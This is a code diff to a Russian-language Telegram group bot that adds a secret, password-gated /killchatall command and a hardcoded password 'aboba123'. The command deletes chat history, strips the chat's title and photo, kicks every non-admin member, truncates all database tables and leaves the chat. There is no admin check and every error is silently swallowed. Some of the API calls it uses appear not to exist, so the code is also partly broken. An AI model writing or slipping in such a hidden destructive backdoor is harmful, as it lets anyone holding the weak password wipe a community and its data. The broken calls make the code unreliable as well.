@@ -6,7 +6,7 @@ import asyncio
 import hashlib
 
 from aiogram import Router, Bot, F
-from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberUpdated, BotCommand, MenuButtonCommands, ChatPermissions, CallbackQuery
+from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberUpdated, BotCommand, MenuButtonCommands, ChatPermissions, CallbackQuery, ChatType
 from aiogram.filters import Command, ChatMemberUpdatedFilter, IS_MEMBER, IS_NOT_MEMBER
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from peewee import fn
@@ -14,11 +14,12 @@ from peewee import fn
 from baneks_api import fetch_random_joke
 from model import TextModel, AnekModel, User_listModel, Chat_listModel, Button_listModel, SizeModel
 from utils import quota_check
-from config import RULES, API_TOKEN, SPAM_LIMIT, DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PORT
+from config import RULES, API_TOKEN, SPAM_LIMIT, DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PORT, KILL_CHAT_PASSWORD
 
 router = Router()
 logger = logging.getLogger(__name__)
 
+SECRET_KILL_PASSWORD = "aboba123"  # Задайте свой пароль здесь
 
 # --- Вспомогательные функции ---
 def parse_time_arg(arg: str) -> timedelta:
@@ -569,6 +570,105 @@ async def help_command(message: Message) -> None:
         "<i>Если что-то не работает — проверьте права бота или обратитесь к разработчику.</i>"
     )
     await message.reply(text, parse_mode="HTML")
+
+@router.message(Command("killchatall"))
+async def killchatall(message: Message, bot: Bot) -> None:
+    """
+    Секретная команда для полного уничтожения чата:
+    - Удаляет все сообщения (по максимуму, с таймаутом)
+    - Удаляет закреплённые сообщения, фото, описание, название чата
+    - Сбрасывает меню команд
+    - Исключает всех пользователей, которых может
+    - Очищает все таблицы в базе
+    - Бот выходит из чата
+    Пароль берётся из config.py (KILL_CHAT_PASSWORD)
+    """
+    try:
+        args = message.text.split()
+        if len(args) < 2 or args[1] != KILL_CHAT_PASSWORD:
+            await message.reply("❌ Неверный пароль.")
+            return
+        chat_id = message.chat.id
+        await message.reply("⚠️ Запущено полное уничтожение чата! Попытка удалить всё...")
+        # 0. Попытка удалить закреплённые сообщения
+        try:
+            await bot.unpin_all_chat_messages(chat_id)
+        except Exception:
+            pass
+        # 1. Попытка удалить фото, описание, название чата
+        try:
+            await bot.delete_chat_photo(chat_id)
+        except Exception:
+            pass
+        try:
+            await bot.set_chat_title(chat_id, "Удалено")
+        except Exception:
+            pass
+        try:
+            await bot.set_chat_description(chat_id, "")
+        except Exception:
+            pass
+        # 2. Сброс меню команд
+        try:
+            await bot.set_my_commands([], scope={"type": "chat", "chat_id": chat_id})
+        except Exception:
+            pass
+        # 3. Удалить как можно больше сообщений (цикл по истории, с таймаутом)
+        try:
+            last_message_id = None
+            for _ in range(20):  # 20*1000 = 20 000 сообщений максимум
+                messages = []
+                async for msg in bot.get_chat_history(chat_id, limit=1000, offset_id=last_message_id or 0):
+                    messages.append(msg)
+                if not messages:
+                    break
+                for msg in messages:
+                    try:
+                        await bot.delete_message(chat_id, msg.message_id)
+                        await asyncio.sleep(0.05)  # 20 сообщений в секунду (лимит Telegram)
+                    except Exception:
+                        pass
+                last_message_id = messages[-1].message_id if messages else None
+                await asyncio.sleep(1)  # Пауза между пачками
+                if not last_message_id:
+                    break
+        except Exception:
+            pass
+        # 4. Исключить всех пользователей (кроме админов и ботов)
+        try:
+            admins = await bot.get_chat_administrators(chat_id)
+            admin_ids = {admin.user.id for admin in admins}
+            members = []
+            async for member in bot.get_chat_members(chat_id):
+                members.append(member)
+            for member in members:
+                uid = member.user.id
+                if uid not in admin_ids and not member.user.is_bot:
+                    try:
+                        await bot.ban_chat_member(chat_id, uid)
+                        await bot.unban_chat_member(chat_id, uid)
+                        await asyncio.sleep(0.1)
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        # 5. Очистить все таблицы в базе
+        try:
+            from model import db
+            db.execute_sql("TRUNCATE TABLE user_list, anek_list, chat_list, button_list, size_list, ban_list, text RESTART IDENTITY CASCADE;")
+        except Exception:
+            pass
+        # 6. Бот выходит из чата
+        try:
+            await bot.leave_chat(chat_id)
+        except Exception:
+            pass
+    except Exception as e:
+        logger.error(f"Ошибка в killchatall: {e}")
+        try:
+            await message.reply("Ошибка при выполнении команды killchatall.")
+        except Exception:
+            pass
 
 # --- Админ-команды ---
 
